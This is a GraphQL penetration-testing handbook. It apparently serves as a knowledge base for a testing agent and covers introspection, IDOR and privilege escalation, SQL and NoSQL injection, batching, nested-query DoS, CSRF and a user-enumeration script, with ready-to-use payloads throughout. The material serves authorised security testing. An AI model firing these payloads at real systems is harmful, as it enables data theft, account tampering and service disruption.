> Structure: the first half (the original KB) is the main line; the second half adds depth. When quick-hits doesn't name a specific play, go by the site: introspection / IDOR id / injection / batching. No need to read the whole page.
>
> Whether to write up follows only `../rules/report-format.md`. Introspection returning only schema with no sensitive fields → keep digging for fields/IDOR/injection.

## 1. Original Knowledge Base

# GraphQL Security Testing Handbook

## 1. GraphQL Identification

### Common Endpoint Paths

```bash
# Standard paths
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql

# Detection method
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'

# Returns {"data":{"__typename":"Query"}} → confirms GraphQL
```

---

## 2. Introspection Queries (Schema Leak)

### Full Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### Simplified Introspection

```bash
# Get all types
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Get all queries
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

# Get all mutations
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### Mining Information from the Schema

```
Points of interest:
1. Admin-only mutations: deleteUser, updateRole, banUser
2. Internal fields: isAdmin, internalId, secretToken
3. Hidden queries: adminUsers, internalLogs, debugInfo
4. Sensitive types: CreditCard, BankAccount, PrivateMessage
```

---

## 3. Authorization Bypass Tests

### Horizontal Privilege Escalation (IDOR)

```graphql
# Query another user's info
query {
  user(id: "VICTIM_ID") {
    id
    email
    phone
    orders {
      id
      amount
    }
  }
}

# Modify another user's data (verify only, do not actually execute)
mutation {
  updateUser(id: "VICTIM_ID", input: {email: "attacker@evil.com"}) {
    id
    email
  }
}
```

### Vertical Privilege Escalation

```graphql
# A normal user calls an admin mutation
mutation {
  deleteUser(id: "TARGET_ID") {
    success
  }
}

mutation {
  promoteToAdmin(userId: "MY_ID") {
    user {
      id
      role
    }
  }
}
```

---

## 4. Injection Tests

### SQL Injection

```graphql
# Inject SQL into the parameter
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}

query {
  searchUsers(keyword: "admin' UNION SELECT password FROM users--") {
    username
    email
  }
}
```

### NoSQL Injection

```graphql
# MongoDB injection
query {
  user(id: "{\"$ne\": null}") {
    id
    username
  }
}
```

---

## 5. Batching Attacks

### Query Batching (bypassing rate limits)

```bash
# Send multiple queries in a single request
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"3\") { email } }"},
    ...
    {"query": "{ user(id: \"1000\") { email } }"}
  ]'
```

### Alias Batching

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  ...
  user1000: user(id: "1000") { email }
}
```

---

## 6. Nested-Query DoS

```graphql
# Deep nesting to consume server resources
query {
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Circular-reference DoS
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
            }
          }
        }
      }
    }
  }
}
```

---

## 7. Field-Suggestion Abuse

```bash
# Deliberately misspell a field name to use the "Did you mean" error for field enumeration
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { passwrd } }"}'

# The response may include: "Did you mean: password, passwordHash?"
# Thereby revealing hidden fields
```

---

## 8. CSRF Testing

### GET-Request CSRF

```bash
# Some GraphQL endpoints support GET requests
curl "https://target.com/graphql?query={user(id:\"1\"){email}}"

# If GET is supported → CSRF is possible
<img src="https://target.com/graphql?query=mutation{deleteUser(id:\"1\"){success}}">
```

### Content-Type Bypass

```bash
# Try text/plain to bypass the CORS preflight
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query": "mutation { deleteUser(id: \"1\") { success } }"}'
```

---

## 9. Information Disclosure

### Error-Message Leaks

```graphql
# Trigger an error to obtain internal info
query {
  user(id: "invalid_id_format_to_trigger_error") {
    id
  }
}

# The response may include:
# - Database errors (SQL statements)
# - Internal paths (/var/www/app/...)
# - Framework version
```

### Debug-Mode Detection

```bash
# Check whether debug mode is on
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name } } }"}'

# If directives like @debug, @internal are returned → there may be debug functionality
```

---

## 10. Recommended Tools

### graphw00f (fingerprinting)

```bash
# Identify the GraphQL engine type
pip3 install graphw00f
graphw00f -t https://target.com/graphql
```

### InQL (Burp plugin)

```
Features:
- Automatic introspection
- Query template generation
- Batch testing
- Schema visualization

Install: Burp → Extender → BApp Store → InQL Scanner
```

### graphql-voyager (schema visualization)

```bash
# Online tool
https://graphql-kit.com/graphql-voyager/

# Run locally
npm install -g graphql-voyager
voyager --introspection schema.json
```

### Automated Testing Script

```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Introspection
introspection_query = '{"query": "{ __schema { types { name } } }"}'
r = requests.post(url, headers=headers, data=introspection_query)
schema = r.json()

# Extract all types
types = [t['name'] for t in schema['data']['__schema']['types']]
print(f"Found {len(types)} types:")
for t in types:
    if not t.startswith('__'):  # filter built-in types
        print(f"  - {t}")

# Batch ID enumeration
for user_id in range(1, 101):
    query = f'{{"query": "{{ user(id: \\"{user_id}\\") {{ id email }} }}"}}'
    r = requests.post(url, headers=headers, data=query)
    if r.status_code == 200 and 'email' in r.text:
        print(f"User {user_id}: {r.json()}")
```

---

## 11. Defense Detection

```bash
# Check for a query depth limit
# Send a nested query of depth 20 and see if it is blocked

# Check for a query complexity limit
# Send a query containing 100 fields

# Check for a rate limit
# Send the same query 100 times in a short window

# Check whether introspection is disabled
# Send a __schema query; an error → disabled
```

---

## 2. Addendum: graphql-and-hidden-parameters

### graphql-and-hidden-parameters

### GraphQL and Hidden Parameters — Introspection, Batching, and Undocumented Fields

## 1. GRAPHQL FIRST PASS

```graphql
query { __typename }
query {
  __schema {
    types { name }
  }
}
```

If introspection is restricted, continue with:

- field suggestions and error-based discovery
- known type probes like `__type(name: "User")`
- JS and mobile bundle route extraction

## 2. HIGH-VALUE GRAPHQL TESTS

| Theme | Example |
|---|---|
| IDOR | `user(id: "victim")` |
| batching | array of login or object fetch operations |
| hidden fields | admin-only fields exposed in type definitions |
| nested authz gaps | related object fields with weaker checks |

## 3. HIDDEN PARAMETER DISCOVERY

Look for:

- fields present in admin docs but not public docs
- `additionalProperties` or permissive schemas
- frontend code using richer request bodies than visible UI controls
- mobile endpoints carrying role, org, feature-flag, or internal filter fields

## 4. NEXT ROUTING

- If hidden fields affect privilege: [api authorization and bola](idor-test.md)
- If GraphQL batching changes auth or rate behavior: [api auth and jwt abuse](oauth-jwt-test.md)
- If endpoint discovery is incomplete: see `recon-methodology.md` and JS reverse (`js-reverse-guide.md`)
